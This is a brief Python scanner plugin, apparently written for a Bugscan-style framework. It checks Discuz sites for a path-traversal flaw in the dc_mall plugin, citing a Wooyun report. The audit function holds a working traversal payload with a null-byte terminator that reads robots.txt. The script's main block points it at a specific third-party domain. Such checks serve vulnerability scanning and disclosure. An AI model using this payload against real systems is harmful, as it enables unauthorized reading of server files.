#!/usr/bin/env python
# -*- coding: utf-8 -*-
#_Author_= hear7v 
#_Refer_ = http://www.wooyun.org/bugs/wooyun-2015-0131386
def assign(service, arg):
    if service == "discuz":
        return True, arg

def audit(arg):
    payload = 'plugin.php?action=../../../../../robots.txt%00&id=dc_mall'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200 and "User-agent" in res and 'robots.txt for Discuz' in res and 'Disallow:' in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('discuz', 'http://www.zhukaocidian.com/')[1])